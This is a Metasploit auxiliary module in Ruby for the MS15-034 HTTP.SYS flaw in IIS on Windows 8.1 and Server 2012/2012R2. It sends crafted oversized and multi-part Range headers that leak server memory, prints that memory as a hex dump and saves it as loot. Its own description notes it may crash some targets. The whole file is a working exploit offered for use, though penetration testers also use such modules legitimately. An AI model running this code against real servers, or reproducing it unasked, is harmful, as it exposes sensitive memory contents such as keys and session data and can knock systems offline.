##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'MS15-034 HTTP.SYS Memory Dump',
      'Description' => %q{
        Dumps memory contents using a crafted Range header. Affects only
        Windows 8.1, Server 2012, and Server 2012R2. Note that if the target
        is running in VMware Workstation, this module has a high likelihood
        of resulting in BSOD; however, VMware ESX and non-virtualized hosts
        seem stable. Using a larger target file should result in more memory
        being dumped, and SSL seems to produce more data as well.
      },
      'Author'      => 'Rich Whitcroft <rwhitcroft[at]gmail.com>',
      'License'     => MSF_LICENSE,
      'References'  => [ ['URL', 'http://securitysift.com/an-analysis-of-ms15-034/'] ]
    )

    register_options([
      OptString.new('TARGET_URI', [ true, 'The path to the resource (must exist!)', '/iisstart.htm' ]),
      OptInt.new('RPORT', [ true, 'The target port', 443 ]),
      OptBool.new('SSL', [ true, 'Use SSL?', true ]),
      OptBool.new('SUPPRESS_REQUEST', [ true, 'Suppress output of the requested resource', true ])
    ], self.class)

    deregister_options('VHOST')
  end

  def check
    res = send_request_raw({
      'uri' => datastore['TARGET_URI'],
      'method' => 'GET',
      'headers' => {
        'Range' => 'bytes=0-18446744073709551615'
      }
    })
    unless res
      print_error("Error in send_request_raw")
      return false
    end

    return (res.body.include?("Requested Range Not Satisfiable") ? true : false)
  end

  def dump(data)
    # clear out the returned resource
    if datastore['SUPPRESS_REQUEST']
      dump_start = data.index('HTTP/1.1 200 OK')
      if dump_start
        data[0..dump_start-1] = ''
      else
        print_error("Memory dump start position not found, dumping all data instead")
      end
    end

    i = 1
    bytes_per_line = 16
    lines_suppressed = 0
    bytes = String.new
    chars = String.new

    print_good("Memory contents:")

    data.each_byte do |b|
      bytes << "%02x" % b.ord

      if b.ord.between?(32, 126)
        chars << b.chr
      else
        chars << "."
      end

      if i > 1 and i % bytes_per_line == 0
        if bytes !~ /^[0f]{32}$/
          bytes.gsub!(/(.{4})/, '\1 ')
          print_status("#{bytes}   #{chars}")
        else
          lines_suppressed += 1
        end

        bytes.clear
        chars.clear
      end

      i += 1
    end

    print_status("Suppressed #{lines_suppressed} uninteresting lines") unless lines_suppressed.zero?
  end

  def run_host(ip)
    begin
      unless check
        print_error("Target is not vulnerable")
        return
      else
        print_good("Target may be vulnerable...")
      end

      # determine the size of the resource
      res = send_request_raw({ 'uri' => datastore['TARGET_URI'], 'method' => 'GET' })
      unless res
        print_error("Error in send_request_raw")
        return
      end

      if res.code == 200
        content_length = res.headers['Content-Length'].to_i
        print_good("Content length is #{content_length} bytes")
      else
        print_error("Error: HTTP code #{res.code}")
        return
      end

      # build the Range header
      ranges = "bytes=3-18446744073709551615"
      range_step = 100
      for range_start in (1..content_length).step(range_step) do
        range_end = range_start + range_step - 1
        range_end = content_length if range_end > content_length
        ranges << ",#{range_start}-#{range_end}"
      end

      sock_opts = {
        'SSL' => datastore['SSL'],
        'SSLVersion' => datastore['SSLVersion'],
        'LocalHost' => nil,
        'PeerHost' => ip,
        'PeerPort' => datastore['RPORT']
      }

      sock = Rex::Socket::Tcp.create(sock_opts)

      req = "GET #{datastore['TARGET_URI']} HTTP/1.1\r\nHost: #{ip}\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)\r\nAccept: */*\r\nConnection: keep-alive\r\nRange: #{ranges}\r\n\r\n"
      sock.put(req)

      print_good("Stand by...")

      resp = String.new
      loop do
        sleep 2

        begin
          buf = sock.get_once(-1, 2)
          if buf
            resp << buf
          else
            break
          end
        rescue
          break
        end
      end

      if resp and not resp.empty?
        dump(resp)
        loot_path = store_loot('iis.ms15034', 'application/octet-stream', ip, resp, nil, 'MS15-034 HTTP.SYS Memory Dump')
        print_status("Memory dump saved to #{loot_path}")
      else
        print_error("Target does not appear to be vulnerable (must be 8.1, 2012, or 2012R2)")
        return
      end
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      print_error("Unable to connect")
      return
    rescue ::Timeout::Error, ::Errno::EPIPE
      print_error("Timeout receiving from socket")
      return
    ensure
      sock.close if sock
    end
  end
end
